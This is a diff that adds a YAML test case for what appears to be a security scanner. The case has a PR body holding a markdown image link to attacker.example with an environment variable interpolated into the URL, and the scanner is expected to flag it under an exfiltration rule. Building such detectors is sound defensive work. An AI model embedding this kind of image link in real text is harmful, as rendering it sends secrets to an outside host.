@@ -1,0 +1,8 @@
+description: "Markdown image URL that interpolates a variable to exfiltrate on render"
+expect_verdict: fail
+expect_rule_ids: [exf.markdown_image_callback]
+inputs:
+  - surface: pr_body
+    text: |
+      Screenshot of the bug:
+      ![preview](https://attacker.example/log?env=${ENV})
